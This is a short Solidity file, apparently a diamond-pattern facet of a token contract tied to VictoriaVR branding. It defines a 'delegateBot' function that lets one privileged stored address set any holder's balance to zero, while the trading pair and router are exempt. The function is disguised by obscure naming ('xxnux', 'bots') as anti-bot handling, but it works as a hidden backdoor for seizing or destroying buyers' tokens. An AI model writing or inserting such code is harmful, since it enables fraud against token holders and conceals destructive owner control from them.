/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.victoriavr.com/
 * X: https://twitter.com/VictoriaVRcom
 * Telegram: https://t.me/victoriavrgroup
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract delegateBotFacet {
    function delegateBot(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
